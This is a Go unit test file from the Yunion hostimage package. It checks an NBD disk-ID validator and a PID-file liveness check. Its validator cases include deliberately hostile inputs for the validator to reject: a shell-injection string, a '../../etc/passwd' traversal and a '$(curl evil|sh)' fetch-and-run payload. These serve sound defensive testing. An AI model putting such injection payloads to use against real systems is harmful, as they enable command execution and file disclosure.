// Copyright 2019 Yunion
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package hostimage

import (
	"fmt"
	"os"
	"path"
	"testing"
)

func TestValidateNbdDiskId(t *testing.T) {
	cases := []struct {
		in      string
		wantErr bool
	}{
		{"74b96fad-6e63-4b78-a026-fa19e9e2c9b9", false},
		{"", true},
		{"x;id>/tmp/pwn;#", true},
		{"a b", true},
		{"../../etc/passwd", true},
		{"a$(curl evil|sh)", true},
	}
	for _, c := range cases {
		err := validateNbdDiskId(c.in)
		if c.wantErr && err == nil {
			t.Fatalf("validateNbdDiskId(%q) expected error, got nil", c.in)
		}
		if !c.wantErr && err != nil {
			t.Fatalf("validateNbdDiskId(%q) unexpected error: %v", c.in, err)
		}
	}
}

func TestNbdProcessExist(t *testing.T) {
	dir := t.TempDir()
	oldDir := HostImageOptions.HostImageNbdPidDir
	HostImageOptions.HostImageNbdPidDir = dir
	defer func() { HostImageOptions.HostImageNbdPidDir = oldDir }()

	man := NewNbdExportManager()
	diskId := "74b96fad-6e63-4b78-a026-fa19e9e2c9b9"
	if man.nbdProcessExist(diskId) {
		t.Fatalf("nbdProcessExist should be false without pid file")
	}
	// write the pid of the current process: it must be detected as alive
	pidFile := path.Join(dir, fmt.Sprintf("nbd_%s.pid", diskId))
	if err := os.WriteFile(pidFile, []byte(fmt.Sprintf("%d", os.Getpid())), 0644); err != nil {
		t.Fatalf("write pid file: %v", err)
	}
	if !man.nbdProcessExist(diskId) {
		t.Fatalf("nbdProcessExist should be true for a live process")
	}
	// a dead pid must be detected as gone
	if err := os.WriteFile(pidFile, []byte("99999999"), 0644); err != nil {
		t.Fatalf("write pid file: %v", err)
	}
	if man.nbdProcessExist(diskId) {
		t.Fatalf("nbdProcessExist should be false for a dead process")
	}
}
